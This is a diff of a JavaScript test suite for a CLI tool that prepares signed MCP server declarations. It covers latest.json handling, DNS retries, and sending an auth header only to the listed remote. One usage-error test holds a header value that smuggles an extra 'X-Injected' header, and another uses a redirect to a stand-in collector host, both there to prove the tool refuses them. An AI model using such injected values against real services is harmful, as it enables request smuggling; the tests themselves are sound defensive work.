@@ -14,13 +14,13 @@ import path from 'node:path';
 import crypto from 'node:crypto';
 import { main, HELP, HELP_PREPARE, PREPARE_STATES } from '../lib/cli.js';
 import { urlHoldsKey, nameHoldsKey } from '../lib/keylike.js';
-import { httpsRequest, isPublicAddress } from '../lib/resolve.js';
+import { httpsRequest, isPublicAddress, keysFromDns, hostWithoutAddress } from '../lib/resolve.js';
 import { signDeclaration, declarationHash, SPEC_ID_01, SPEC_ID_02, STATES } from '../lib/declaration.js';
 import { parseProofRecords } from '../lib/keys.js';
 import { toolsHash } from '../lib/tools.js';
 import { toolSetDigestsFromPages } from '../lib/tool-set-digest.js';
 import { LISTING_STATES, registryBase, DEFAULT_REGISTRY } from '../lib/listing.js';
-import { MODERN_PROTOCOL_VERSION } from '../lib/mcp-client.js';
+import { MODERN_PROTOCOL_VERSION, fetchToolsList } from '../lib/mcp-client.js';
 import { makeKey, TOOLS } from '../testlib/helpers.js';
 
 const NAME = 'com.example/weather';
@@ -100,7 +100,8 @@ function mcpServer(mode = 'modern', { tools = TOOLS.tools, log = [] } = {}) {
   };
 }
 
-async function world({ registry = {}, site = {}, httpKeys = { keys: published, notes: [] }, dnsKeys = { keys: [], notes: ['no TXT records at example.com'] }, extraDeps = {} } = {}) {
+// lookupFor: (url) => a lookupAll for the hardened fetch, or undefined for 127.0.0.1.
+async function world({ registry = {}, site = {}, httpKeys = { keys: published, notes: [] }, dnsKeys = { keys: [], notes: ['no TXT records at example.com'] }, extraDeps = {}, lookupFor } = {}) {
   const seen = [];
   const reg = await serve(registry, seen);
   const st = await serve(site, seen);
@@ -108,7 +109,7 @@ async function world({ registry = {}, site = {}, httpKeys = { keys: published, n
     const u = new URL(url);
     if (u.protocol === 'http:') return httpsRequest(url, opts);
     const local = `http://${u.hostname}:${st.port}${u.pathname}${u.search}`;
-    return httpsRequest(local, { ...opts, transport: http, lookupAll: async () => [{ address: '127.0.0.1', family: 4 }], allowAddress: (a) => a === '127.0.0.1' || isPublicAddress(a) });
+    return httpsRequest(local, { ...opts, transport: http, lookupAll: (lookupFor && lookupFor(u)) || (async () => [{ address: '127.0.0.1', family: 4 }]), allowAddress: (a) => a === '127.0.0.1' || isPublicAddress(a) });
   };
   const lookups = [];
   const deps = {
@@ -155,7 +156,10 @@ async function scenario(opts, args, fn, runOpts) {
   }
 }
 
-const baseRegistry = (extra = {}) => ({ [regPath()]: { body: listingFor() }, ...extra });
+// The registry's list of versions of a name (GET /v0.1/servers/<name>/versions).
+const versionsPath = (name = NAME) => `/v0.1/servers/${name.replace('/', '%2F')}/versions`;
+const versionsList = (...listings) => ({ body: { servers: listings, metadata: { count: listings.length } } });
+const baseRegistry = (extra = {}) => ({ [regPath()]: { body: listingFor() }, [versionsPath()]: versionsList(listingFor()), ...extra });
 const baseSite = (extra = {}) => ({ [`POST ${HOST}/mcp`]: mcpServer(), ...extra });
 const ENV = { MCP_PRIVATE_KEY: k.hex };
 
@@ -409,13 +413,16 @@ test('an existing declaration at latest.json is verified and linked as previous;
     assert.ok(r.json.notes.some((n) => /crosses a change of key/.test(n)));
     assert.ok(r.json.verify.checked.some((c) => /the key changed/.test(c)), r.json.verify.checked.join('; '));
   }, { env: ENV });
-  // A declaration whose signature does not verify under a published key is not linked, and the note says why.
+  // A declaration for this server whose signature does not verify under a
+  // published key is not linked; since a declaration for this server is there,
+  // the run stops (previous_not_linkable) instead of starting a new history.
   const forged = { ...JSON.parse(text(d2)), signature: JSON.parse(text(d1)).signature };
   await scenario({ registry: baseRegistry(), site: baseSite({ [`${HOST}${folder}latest.json`]: { body: text(forged) } }) }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut(), '--json'], (r) => {
-    assert.equal(r.code, 0, r.stdout + r.stderr);
+    assert.equal(r.code, 36, r.stdout + r.stderr);
     assert.equal(r.json.previous.linked, false);
     assert.equal(r.json.previous.result, 'invalid_signature');
     assert.ok(r.json.notes.some((n) => /latest\.json is not linked as previous: it gives invalid_signature/.test(n)));
+    assert.ok(r.json.reasons.some((x) => /give --no-previous to start a new history on purpose/.test(x)));
   }, { env: ENV });
 });
 
@@ -1930,4 +1937,636 @@ test('histor-tool-sets.js: the member, its self check and the comparison follow 
   assert.equal(H.readHistorMember('x').readable, false);
   assert.equal(H.readHistorMember({ mtl: 1, sets: [{ digest: tsd.contract.digest }] }).readable, false);
   assert.deepEqual(H.readHistorMember({ mtl: '1', url: 'https://example.com/s.json' }, NAME), { readable: true, problem: null, mtl: '1', sets: 0, digests: [], url: 'https://example.com/s.json', urlRefused: null, skipped: [] });
+});
+
+// ---- field study (20 November 2026): first time publishers ----
+
+const TOOLS_FILE = path.join(tmp, 'field-tools.json');
+fs.writeFileSync(TOOLS_FILE, TOOLS_TEXT);
+const latestPath = `${HOST}${folder}latest.json`;
+const NO_DASH = /\s-\s|\s--\s|[‒-―−]/;
+
+test('F1: with no pointer in the listing, latest.json that is definitely not a declaration gives a first declaration and a note', async () => {
+  const bigHtml = '<!doctype html><html><body>' + 'x'.repeat(20000) + '</body></html>';
+  const cases = [
+    ['301 redirect', { status: 301, headers: { Location: 'https://www.example.com/' }, body: '' }, 'redirect', /HTTP 301, a permanent redirect to https:\/\/www\.example\.com\/, which check-listing does not follow/],
+    ['308 redirect', { status: 308, headers: { Location: '/elsewhere' }, body: '' }, 'redirect', /HTTP 308, a permanent redirect/],
+    ['200 over 16384 bytes', { status: 200, headers: { 'Content-Type': 'text/html' }, body: bigHtml }, 'too_large', /HTTP 200 with a body larger than 16384 bytes/],
+    ['404 over 16384 bytes', { status: 404, headers: { 'Content-Type': 'text/html' }, body: bigHtml }, 'absent', /HTTP 404 with a body larger than 16384 bytes/],
+  ];
+  for (const [label, answer, result, seen] of cases) {
+    const out = freshOut();
+    await scenario({ registry: baseRegistry(), site: baseSite({ [latestPath]: answer }) }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out, '--json'], (r) => {
+      assert.equal(r.code, 0, `${label}: ${r.stdout}${r.stderr}`);
+      assert.equal(r.json.state, 'prepared');
+      assert.equal(r.json.previous.linked, false);
+      assert.equal(r.json.previous.result, result, label);
+      assert.match(r.json.previous.reason, seen, label);
+      assert.equal(r.json.declaration.previous, null);
+      const note = r.json.notes.find((n) => n.startsWith(`https://${HOST}${folder}latest.json answered`));
+      assert.ok(note, `${label}: a note says what was seen at latest.json`);
+      assert.match(note, /names no declaration and the registry lists 1 version of com\.example\/weather, and none names a declaration, so this run makes the first declaration for this server/);
+      assert.ok(note.includes(`to be served in https://${HOST}${folder}, each with HTTP status 200 and no redirect`), note);
+      assert.match(note, /If you served a declaration at that address before, do not use the files of this run/);
+      assert.ok(!NO_DASH.test(note.replace(/--[a-z]/g, '')), 'no dash punctuation');
+      assert.ok(!/\b(never|guaranteed|safe|secure|trusted)\b/i.test(note));
+      assert.match(r.json.steps.find((s) => s.step === 5).line, /the listing names no declaration and the registry lists 1 version of com\.example\/weather, and none names a declaration, so there is no previous declaration/);
+    }, { env: ENV });
+    assert.ok(fs.existsSync(path.join(out, 'NEXT_STEPS.txt')), label);
+  }
+  // A small page that is not a declaration was already read as no previous declaration; it now gets the same note.
+  await scenario({ registry: baseRegistry(), site: baseSite({ [latestPath]: { headers: { 'Content-Type': 'text/html' }, body: '<html>catch all</html>' } }) }, [NAME, '--for-version', '1.0.1', '--out', freshOut(), '--json'], (r) => {
+    assert.equal(r.code, 0, r.stdout + r.stderr);
+    assert.equal(r.json.previous.result, 'invalid');
+    assert.ok(r.json.notes.some((n) => /latest\.json answered HTTP 200 with a file that is not linked as previous \(not a declaration: .*so this run makes the first declaration for this server\. The files this run writes for upload are to be served in/.test(n)), r.json.notes.join('\n'));
+  });
+});
+
+test('F1: a host with no address in DNS, confirmed by the name servers, gives a first declaration; an unconfirmed ENOTFOUND does not', async () => {
+  const enotfound = (u) => (u.hostname === HOST && u.pathname.endsWith('latest.json') ? async () => { throw Object.assign(new Error('getaddrinfo ENOTFOUND'), { code: 'ENOTFOUND' }); } : undefined);
+  const asked = [];
+  const resolvers = [];
+  const noAddress = { dnsResolverFor: (server) => (resolvers.push(server), { tag: 'resolver' }), hostWithoutAddress: async (h, o) => (asked.push([h, o.resolver.tag]), { noAddress: true, detail: 'the name servers answered the A query with ENODATA and the AAAA query with ENODATA' }) };
+  await scenario({ registry: baseRegistry(), site: baseSite(), lookupFor: enotfound, extraDeps: noAddress }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut(), '--dns-server', '192.0.2.53', '--json'], (r) => {
+    assert.equal(r.code, 0, r.stdout + r.stderr);
+    assert.equal(r.json.previous.result, 'host_not_found');
+    assert.match(r.json.previous.reason, /the host example\.com has no address in DNS \(the system lookup gave ENOTFOUND, and the name servers answered the A query with ENODATA/);
+    assert.ok(r.json.notes.some((n) => /so example\.com needs an address in DNS first/.test(n)));
+    assert.ok(r.json.fetched.some((f) => f.method === 'A/AAAA' && f.domain === HOST && f.answered === true));
+  }, { env: ENV });
+  assert.deepEqual(asked, [[HOST, 'resolver']]);
+  assert.ok(resolvers.length > 0 && resolvers.every((s) => s === '192.0.2.53'), '--dns-server names the resolver asked');
+  // The text output shows the DNS query as a request line.
+  await scenario({ registry: baseRegistry(), site: baseSite(), lookupFor: enotfound, extraDeps: noAddress }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut()], (r) => {
+    assert.equal(r.code, 0, r.stdout + r.stderr);
+    assert.match(r.stdout, /request: answered DNS A and AAAA queries for example\.com/);
+  });
+  // The name servers do not confirm it (a timeout): previous_unreadable, with the --no-previous way out.
+  const unsure = { hostWithoutAddress: async () => ({ noAddress: false, detail: 'the name servers answered the A query with ETIMEOUT and the AAAA query with ETIMEOUT' }) };
+  await scenario({ registry: baseRegistry(), site: baseSite(), lookupFor: enotfound, extraDeps: unsure }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut()], (r) => {
+    assert.equal(r.code, 35, r.stdout + r.stderr);
+    assert.match(r.stdout, /could not resolve host \(ENOTFOUND\); the name servers answered the A query with ETIMEOUT/);
+    assert.match(r.stdout, /give --no-previous to make this the first one/);
+  });
+  // A lookup that throws is not taken as an answer either.
+  await scenario({ registry: baseRegistry(), site: baseSite(), lookupFor: enotfound, extraDeps: { hostWithoutAddress: async () => { throw new Error('boom'); } } }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut()], (r) => {
+    assert.equal(r.code, 35, r.stdout + r.stderr);
+  });
+  // EAI_AGAIN (the resolver could not answer) is a passing fault: the name servers are not even asked.
+  let calls = 0;
+  const again = (u) => (u.pathname.endsWith('latest.json') ? async () => { throw Object.assign(new Error('getaddrinfo EAI_AGAIN'), { code: 'EAI_AGAIN' }); } : undefined);
+  await scenario({ registry: baseRegistry(), site: baseSite(), lookupFor: again, extraDeps: { hostWithoutAddress: async () => (calls++, { noAddress: true, detail: 'x' }) } }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut()], (r) => {
+    assert.equal(r.code, 35, r.stdout + r.stderr);
+    assert.match(r.stdout, /EAI_AGAIN/);
+  });
+  assert.equal(calls, 0);
+});
+
+test('F1: passing faults and temporary redirects at latest.json still stop the run, and a listing that names a pointer keeps its rules', async () => {
+  const stops = [
+    ['302', { status: 302, headers: { Location: '/' }, body: '' }, /answered HTTP 302/],
+    ['307', { status: 307, headers: { Location: '/' }, body: '' }, /answered HTTP 307/],
+    ['503', { status: 503, body: 'busy' }, /answered HTTP 503/],
+    ['403', { status: 403, body: 'denied' }, /answered HTTP 403/],
+    ['500 with a large body', { status: 500, body: 'y'.repeat(20000) }, /larger than 16384 bytes/],
+    ['dropped connection', (req) => req.socket.destroy(), /could not be read/],
+  ];
+  for (const [label, answer, why] of stops) {
+    await scenario({ registry: baseRegistry(), site: baseSite({ [latestPath]: answer }) }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut()], (r) => {
+      assert.equal(r.code, 35, `${label}: ${r.stdout}${r.stderr}`);
+      assert.match(r.stdout, why, label);
+      assert.match(r.stdout, /names no declaration\. If you have not served a declaration at https:\/\/example\.com\/\.well-known\/addon-declaration\/com\.example\/weather\/latest\.json before, give --no-previous/, label);
+    });
+  }
+  // With a pointer in the listing (even one that cannot be read), a redirect or a large body at latest.json stops as before, without that hint.
+  const named = baseRegistry({ [regPath()]: { body: listingFor({ pointerTo: d2 }) } });
+  const malformed = baseRegistry({ [regPath()]: { body: listingFor({ meta: { [PP]: { addonDeclaration: { url: 'not a url' } } } }) } });
+  for (const [label, registry] of [['named pointer', named], ['malformed pointer', malformed]]) {
+    for (const answer of [{ status: 301, headers: { Location: '/' }, body: '' }, { status: 200, body: 'z'.repeat(20000) }]) {
+      await scenario({ registry, site: baseSite({ [latestPath]: answer, [`${HOST}${folder}by-hash/${hex(d2)}.json`]: { body: text(d2) } }) }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut()], (r) => {
+        assert.equal(r.code, 35, `${label} ${answer.status}: ${r.stdout}${r.stderr}`);
+        assert.ok(!/give --no-previous to make this the first one/.test(r.stdout), label);
+      });
+    }
+  }
+});
+
+// An MCP server double that answers only with the right header value.
+function guardedMcp(expect, { headerName = 'authorization', seen = [], echo = false } = {}) {
+  return (req, res, body) => {
+    seen.push(req.headers[headerName]);
+    if (req.headers[headerName] !== expect) {
+      if (echo) {
+        res.writeHead(400, { 'Content-Type': 'application/json' });
+        return res.end(JSON.stringify({ jsonrpc: '2.0', id: null, error: { code: -32000, message: `bad credential ${req.headers[headerName]}` } }));
+      }
+      res.writeHead(401, { 'WWW-Authenticate': 'Bearer resource_metadata="https://example.com/.well-known/oauth-protected-resource"' });
+      return res.end();
+    }
+    return mcpServer()(req, res, body);
+  };
+}
+const TOKEN = 'tok_9f8e7d6c5b4a39281706f5e4d3c2b1a0';
+const BEARER = `Bearer ${TOKEN}`;
+
+test('F2: --tools-header-env reads the publisher\'s own remote with a header from the environment; the value is not printed or written', async () => {
+  const out = freshOut();
+  const seenAuth = [];
+  await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: guardedMcp(BEARER, { seen: seenAuth }) }) }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--tools-header-env', 'Authorization=MCP_TOOLS_AUTH', '--out', out], (r, w) => {
+    assert.equal(r.code, 0, r.stdout + r.stderr);
+    assert.match(r.stdout, /step 4, tools: read 1 page of tools\/list from https:\/\/example\.com\/mcp/);
+    assert.match(r.stdout, /note: --tools-header-env: Authorization \(the value from MCP_TOOLS_AUTH, not shown\) was sent with the requests to https:\/\/example\.com\/mcp only, over https/);
+    assert.ok(!r.stdout.includes(TOKEN) && !r.stderr.includes(TOKEN), 'the value is not printed');
+    // Only the remote got the header: no other request carried it.
+    for (const s of w.seen) if (!(s.method === 'POST' && s.path === '/mcp')) assert.equal(s.headers.authorization, undefined, `${s.method} ${s.path}`);
+  }, { env: { ...ENV, MCP_TOOLS_AUTH: `${BEARER}\r\n` } });
+  assert.deepEqual(seenAuth, [BEARER], 'sent once, with the trailing line break dropped');
+  for (const f of filesUnder(out)) assert.ok(!fs.readFileSync(path.join(out, f), 'utf8').includes(TOKEN), `${f} holds the value`);
+  const next = fs.readFileSync(path.join(out, 'NEXT_STEPS.txt'), 'utf8');
+  assert.match(next, /The tool list was read with --tools-header-env\. check-listing --fetch-tools sends no credentials, so for a remote that asks for authorization it reports the tool list as not checked/);
+  assert.ok(!NO_DASH.test(next.replace(/--[a-z]/g, '')), 'no dash punctuation');
+  // --json names the header, not the value.
+  await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: guardedMcp(TOKEN, { headerName: 'x-api-key' }) }) }, [NAME, '--for-version', '1.0.1', '--tools-header-env', 'X-API-KEY=MY_KEY', '--out', freshOut(), '--json'], (r) => {
+    assert.equal(r.code, 0, r.stdout + r.stderr);
+    assert.deepEqual(r.json.tools.headers, ['X-API-KEY']);
+    assert.ok(!r.stdout.includes(TOKEN));
+  }, { env: { MY_KEY: TOKEN } });
+});
+
+test('F2: a 401 or 403 says what to do next: --tools-header-env with the header the listing declares, or --tools with a saved list', async () => {
+  await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: mcpServer('auth') }) }, [NAME, '--for-version', '1.0.1', '--out', freshOut()], (r) => {
+    assert.equal(r.code, 30, r.stdout + r.stderr);
+    assert.match(r.stdout, /step 4, tools: https:\/\/example\.com\/mcp asked for authorization \(HTTP 401\)/);
+    assert.match(r.stdout, /answered tools\/list with HTTP 401, so it asked for authorization/);
+    assert.match(r.stdout, /--tools-header-env "Authorization=MCP_TOOLS_AUTH" with MCP_TOOLS_AUTH set to "Bearer <your token>"/);
+    assert.match(r.stdout, /The value is sent only to https:\/\/example\.com\/mcp, over https, and is not printed or written/);
+    assert.match(r.stdout, /or save the tools\/list result of this build as tools\.json \(the "result" object or the whole JSON-RPC response, as the server sent it, without "data:" framing; one file per page, in order\) and give --tools tools\.json/);
+    const reasons = r.stdout.split('\n').filter((l) => l.startsWith('  reason: ')).join('\n');
+    assert.ok(!NO_DASH.test(reasons.replace(/--[a-z]/g, '')), reasons);
+  });
+  // A listing that declares the header for the remote: that name is suggested.
+  const withHeader = listingFor({ remotes: [{ type: 'streamable-http', url: REMOTE, headers: [{ name: 'X-API-KEY', isRequired: true, isSecret: true }] }] });
+  await scenario({ registry: baseRegistry({ [regPath()]: { body: withHeader } }), site: baseSite({ [`POST ${HOST}/mcp`]: mcpServer('auth') }) }, [NAME, '--for-version', '1.0.1', '--out', freshOut()], (r) => {
+    assert.equal(r.code, 30, r.stdout + r.stderr);
+    assert.match(r.stdout, /--tools-header-env "X-API-KEY=MCP_TOOLS_HEADER" with MCP_TOOLS_HEADER set to the value of X-API-KEY \(the listing declares the header X-API-KEY for this remote\)/);
+  });
+  // A 403 with no Bearer challenge (the server then also refuses initialize): the same advice.
+  const forbid = (req, res) => {
+    res.writeHead(403, { 'Content-Type': 'text/plain' });
+    res.end('forbidden');
+  };
+  await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: forbid }) }, [NAME, '--for-version', '1.0.1', '--out', freshOut()], (r) => {
+    assert.equal(r.code, 30, r.stdout + r.stderr);
+    assert.match(r.stdout, /answered tools\/list with HTTP 403, so it asked for authorization/);
+    assert.match(r.stdout, /--tools-header-env "Authorization=MCP_TOOLS_AUTH"/);
+  });
+  // The header given and still refused: check the variable; the value is not shown, also when the server repeats it.
+  for (const echo of [false, true]) {
+    await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: guardedMcp('Bearer other', { echo }) }) }, [NAME, '--for-version', '1.0.1', '--tools-header-env', 'Authorization=MCP_TOOLS_AUTH', '--out', freshOut(), '--json'], (r) => {
+      assert.equal(r.code, 30, r.stdout + r.stderr);
+      assert.ok(!r.stdout.includes(TOKEN), `echo ${echo}: the value reached the output`);
+      if (echo) assert.ok(r.stdout.includes('<header value hidden>'), 'the repeated value is hidden');
+      else {
+        assert.ok(r.json.reasons.some((x) => /also with the header Authorization sent from MCP_TOOLS_AUTH/.test(x)));
+        assert.ok(r.json.reasons.some((x) => /check that MCP_TOOLS_AUTH holds the whole header value the server expects/.test(x)));
+      }
+    }, { env: { MCP_TOOLS_AUTH: BEARER } });
+  }
+});
+
+test('F2: the header goes only to the listed remote over https, is not forwarded on a redirect, and bad input is refused before any request', async () => {
+  // A redirect from the remote: not followed, so the other host gets nothing.
+  const redirect = (req, res) => {
+    res.writeHead(307, { Location: 'https://collector.example.net/mcp' });
+    res.end();
+  };
+  await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: redirect }) }, [NAME, '--for-version', '1.0.1', '--tools-header-env', 'Authorization=MCP_TOOLS_AUTH', '--out', freshOut()], (r, w) => {
+    assert.equal(r.code, 30, r.stdout + r.stderr);
+    assert.match(r.stdout, /redirect, which is not followed/);
+    assert.ok(!w.seen.some((s) => s.host === 'collector.example.net'), 'the redirect target was not contacted');
+    assert.equal(w.seen.filter((s) => s.headers.authorization !== undefined).length, 1, 'only the one request to the remote carried it');
+  }, { env: { MCP_TOOLS_AUTH: BEARER } });
+  // --server-json names a remote the listing does not: nothing is sent to it.
+  const sj = path.join(tmp, 'server-other-remote.json');
+  fs.writeFileSync(sj, JSON.stringify({ name: NAME, version: '1.0.1', remotes: [{ type: 'streamable-http', url: 'https://mcp.example.org/mcp' }] }));
+  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--server-json', sj, '--tools-header-env', 'Authorization=MCP_TOOLS_AUTH', '--out', freshOut()], (r, w) => {
+    assert.equal(r.code, 30, r.stdout + r.stderr);
+    assert.match(r.stdout, /--tools-header-env sends its headers only to a streamable-http remote that the listing of 1\.0\.0 names, over https; the remote to read here, https:\/\/mcp\.example\.org\/mcp \(from server\.json\), is not one of them/);
+    assert.ok(!w.seen.some((s) => s.method === 'POST'), 'no tools/list was sent');
+  }, { env: { MCP_TOOLS_AUTH: BEARER } });
+  // Usage errors: before any request, and nothing given is repeated.
+  const bad = [
+    [['--tools-header-env', `Authorization=${BEARER}`], {}, /after "=" comes the NAME of an environment variable/],
+    [['--tools-header-env', `Authorization:${TOKEN}`], {}, /give --tools-header-env as HEADER=VARIABLE_NAME/],
+    [['--tools-header-env', 'Authorization=MCP_TOOLS_AUTH'], {}, /the environment variable MCP_TOOLS_AUTH is not set/],
+    [['--tools-header-env', 'Authorization=MCP_TOOLS_AUTH'], { MCP_TOOLS_AUTH: '  \n' }, /the environment variable MCP_TOOLS_AUTH is empty/],
+    [['--tools-header-env', 'Authorization=MCP_TOOLS_AUTH'], { MCP_TOOLS_AUTH: `Bearer ${TOKEN}\nX-Injected: 1` }, /holds a line break, a control character/],
+    [['--tools-header-env', 'Content-Type=MCP_TOOLS_AUTH'], { MCP_TOOLS_AUTH: BEARER }, /set by prepare itself/],
+    [['--tools-header-env', 'Mcp-Session-Id=MCP_TOOLS_AUTH'], { MCP_TOOLS_AUTH: BEARER }, /set by prepare itself/],
+    [['--tools-header-env', `${k.hex}=MCP_TOOLS_AUTH`], { MCP_TOOLS_AUTH: BEARER }, /looks like key material or a token/],
+    [['--tools-header-env', 'Bad Name=MCP_TOOLS_AUTH'], { MCP_TOOLS_AUTH: BEARER }, /must be 1 to 64 letters/],
+    [['--tools-header-env', 'Authorization=A', '--tools-header-env', 'authorization=B'], { A: 'x', B: 'y' }, /names the header authorization more than once/],
+    [['--tools-header-env', 'Authorization=MCP_TOOLS_AUTH', '--tools', TOOLS_FILE], { MCP_TOOLS_AUTH: BEARER }, /give --tools-header-env or --tools, not both/],
+    [['--dns-server', 'resolver.example'], {}, /--dns-server must be an IP address/],
+  ];
+  for (const [args, env, why] of bad) {
+    await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', ...args, '--out', freshOut()], (r, w) => {
+      assert.equal(r.code, 1, `${args.join(' ')}: ${r.stdout}${r.stderr}`);
+      assert.match(r.stderr, why, args.join(' '));
+      assert.ok(!r.stderr.includes(TOKEN) && !r.stdout.includes(TOKEN), 'the value is not repeated');
+      assert.ok(!r.stderr.includes(k.hex), 'a key given as a name is not repeated');
+      assert.equal(w.seen.length, 0, 'no request');
+    }, { env });
+  }
+  // check-listing does not take the option (it sends no credentials, SPEC.md section 8a).
+  const c = await cli(['check-listing', NAME, '--fetch-tools', '--tools-header-env', 'Authorization=X']);
+  assert.equal(c.code, 1);
+  assert.match(c.stderr, /--tools-header-env is not an option of check-listing/);
+});
+
+test('F2: fetchToolsList sends the extra headers on every request to the remote, and they cannot replace the protocol headers', async () => {
+  const sent = [];
+  let sessionEnded = false;
+  const request = async (url, opts) => {
+    sent.push({ url, method: opts.method, headers: { ...opts.headers } });
+    const body = opts.body ? JSON.parse(opts.body) : null;
+    if (opts.method === 'DELETE') {
+      sessionEnded = true;
+      return { status: 200, headers: {}, body: Buffer.alloc(0) };
+    }
+    if (body.params && body.params._meta) return { status: 400, headers: { 'content-type': 'text/plain' }, body: Buffer.from('old server') };
+    if (body.method === 'initialize') return { status: 200, headers: { 'content-type': 'application/json', 'mcp-session-id': 'abc' }, body: Buffer.from(JSON.stringify({ jsonrpc: '2.0', id: body.id, result: { protocolVersion: '2025-11-25', capabilities: {}, serverInfo: { name: 's', version: '1' } } })) };
+    if (body.method === 'notifications/initialized') return { status: 202, headers: {}, body: Buffer.alloc(0) };
+    return { status: 200, headers: { 'content-type': 'application/json' }, body: Buffer.from(JSON.stringify({ jsonrpc: '2.0', id: body.id, result: TOOLS })) };
+  };
+  const got = await fetchToolsList(REMOTE, { request, headers: { Authorization: BEARER, Accept: 'text/html' } });
+  assert.equal(got.era, 'legacy');
+  assert.ok(sessionEnded);
+  assert.equal(sent.length, 5);
+  for (const s of sent) {
+    assert.equal(s.url, REMOTE);
+    assert.equal(s.headers.Authorization, BEARER, `${s.method} carries the header`);
+    if (s.method === 'POST') assert.equal(s.headers.Accept, 'application/json, text/event-stream', 'the protocol header wins');
+  }
+});
+
+test('F3: a dns lookup that timed out or got SERVFAIL is sent once more by prepare, and the message says a later run may help', async () => {
+  // keysFromDns: retries only for ETIMEOUT and ESERVFAIL, and only when asked to.
+  const flaky = (codes) => {
+    const calls = [];
+    return { calls, resolver: { resolveTxt: async (n) => { calls.push(n); const c = codes.shift(); if (c) throw Object.assign(new Error(c), { code: c }); return [[k.record]]; } } };
+  };
+  let f = flaky(['ETIMEOUT']);
+  let r = await keysFromDns(HOST, { resolver: f.resolver, retries: 1 });
+  assert.equal(r.error, undefined);
+  assert.equal(r.keys.length, 1);
+  assert.equal(f.calls.length, 2);
+  assert.ok(r.notes.some((n) => /failed \(ETIMEOUT\) and was sent again/.test(n)));
+  f = flaky(['ESERVFAIL', 'ESERVFAIL']);
+  r = await keysFromDns(HOST, { resolver: f.resolver, retries: 1 });
+  assert.match(r.error, /failed \(ESERVFAIL\), also when asked 2 times/);
+  assert.equal(r.transient, true);
+  assert.equal(f.calls.length, 2);
+  f = flaky(['ETIMEOUT']);
+  r = await keysFromDns(HOST, { resolver: f.resolver });
+  assert.match(r.error, /ETIMEOUT/);
+  assert.equal(f.calls.length, 1, 'verify and check-listing ask once (no retries by default)');
+  f = flaky(['ECONNREFUSED']);
+  r = await keysFromDns(HOST, { resolver: f.resolver, retries: 1 });
+  assert.equal(f.calls.length, 1, 'other errors are not retried');
+  assert.equal(r.transient, undefined);
+  f = flaky(['ENOTFOUND']);
+  r = await keysFromDns(HOST, { resolver: f.resolver, retries: 1 });
+  assert.equal(r.error, undefined);
+  assert.equal(f.calls.length, 1);
+
+  // prepare asks keysFromDns with one retry, through the resolver --dns-server names.
+  const opts = [];
+  const dnsFail = { keysFromDns: async (domain, o) => (opts.push(o), { keys: [], notes: [], error: `DNS lookup for ${domain} failed (ETIMEOUT), also when asked 2 times`, transient: true }), dnsResolverFor: (server) => ({ server }) };
+  await scenario({ registry: baseRegistry(), site: baseSite(), extraDeps: dnsFail }, [NAME, '--for-version', '1.0.1', '--method', 'dns', '--dns-server', '192.0.2.53', '--out', freshOut()], (r2) => {
+    assert.equal(r2.code, 27, r2.stdout + r2.stderr);
+    assert.match(r2.stdout, /timed out or got SERVFAIL from the resolver, also when it was sent a second time/);
+    assert.match(r2.stdout, /a run a few minutes later may get an answer, so run prepare again/);
+    assert.match(r2.stdout, /give --dns-server <IP address of a resolver you choose>/);
+  });
+  assert.ok(opts.length >= 1);
+  assert.ok(opts.every((o) => o.retries === 1 && o.resolver.server === '192.0.2.53'));
+  // Without --dns-server the system resolver is used (no address is added).
+  opts.length = 0;
+  await scenario({ registry: baseRegistry(), site: baseSite(), extraDeps: dnsFail }, [NAME, '--for-version', '1.0.1', '--method', 'dns', '--out', freshOut()], (r2) => {
+    assert.equal(r2.code, 27, r2.stdout + r2.stderr);
+  });
+  assert.ok(opts.length >= 1 && opts.every((o) => o.resolver.server === undefined));
+});
+
+test('F4: an http lookup whose body is too large, followed by a dns key, does not read as a failure; a URL template remote says what can be done', async () => {
+  const tooLarge = { keys: [], notes: [], error: 'could not fetch https://example.com/.well-known/mcp-registry-auth (body larger than 4096 bytes)' };
+  await scenario({ registry: baseRegistry(), site: baseSite(), httpKeys: tooLarge, dnsKeys: { keys: published, notes: [] } }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut()], (r) => {
+    assert.equal(r.code, 0, r.stdout + r.stderr);
+    assert.match(r.stdout, /step 2, key record: found by the dns method at the TXT records of example\.com: .*\(tried first: http at example\.com, no usable answer\)/);
+    assert.ok(!/lookup failed|request: failed/.test(r.stdout), r.stdout);
+    assert.match(r.stdout, /note: the http key lookup at example\.com gave no usable answer \(could not fetch .*body larger than 4096 bytes\)\); the key was then found by the dns method at the TXT records of example\.com, so this does not affect the declaration/);
+    assert.match(r.stdout, /request: no usable answer, another key location answered \(could not fetch .*\) GET https:\/\/example\.com\/\.well-known\/mcp-registry-auth/);
+  }, { env: ENV });
+  // A URL template in the listing.
+  const tpl = listingFor({ remotes: [{ type: 'streamable-http', url: 'https://{tenant}.example.com/mcp', variables: { tenant: { isRequired: true } } }] });
+  await scenario({ registry: baseRegistry({ [regPath()]: { body: tpl } }), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--out', freshOut()], (r) => {
+    assert.equal(r.code, 29, r.stdout + r.stderr);
